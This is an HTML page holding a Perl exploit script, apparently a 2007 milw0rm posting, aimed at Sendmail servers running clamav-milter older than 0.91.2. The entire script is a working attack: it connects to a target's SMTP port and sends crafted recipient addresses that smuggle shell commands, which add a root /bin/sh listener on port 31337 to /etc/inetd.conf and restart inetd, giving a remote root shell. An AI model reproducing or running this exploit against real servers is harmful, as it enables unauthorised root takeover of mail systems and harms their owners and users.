<html><head><title>Sendmail with clamav-milter < 0.91.2 Remote Root Exploit</title></head><pre>### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket;

print &quot;Sendmail w/ clamav-milter Remote Root Exploit\n&quot;;
print &quot;Copyright (C) 2007 Eliteboy\n&quot;;

if ($#ARGV != 0) {print &quot;Give me a host to connect.\n&quot;;exit;}

print &quot;Attacking $ARGV[0]...\n&quot;;

$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $ARGV[0],
                              PeerPort =&gt; '25',
                              Proto    =&gt; 'tcp');

print $sock &quot;ehlo you\r\n&quot;;
print $sock &quot;mail from: &lt;&gt;\r\n&quot;;
print $sock &quot;rcpt to: &lt;nobody+\&quot;|echo '31337 stream tcp nowait root /bin/sh -i' &gt;&gt; /etc/inetd.conf\&quot;@localhost&gt;\r\n&quot;;
print $sock &quot;rcpt to: &lt;nobody+\&quot;|/etc/init.d/inetd restart\&quot;@localhost&gt;\r\n&quot;;
print $sock &quot;data\r\n.\r\nquit\r\n&quot;;

while (&lt;$sock&gt;) {
        print;
}

# milw0rm.com [2007-12-21]</pre></html>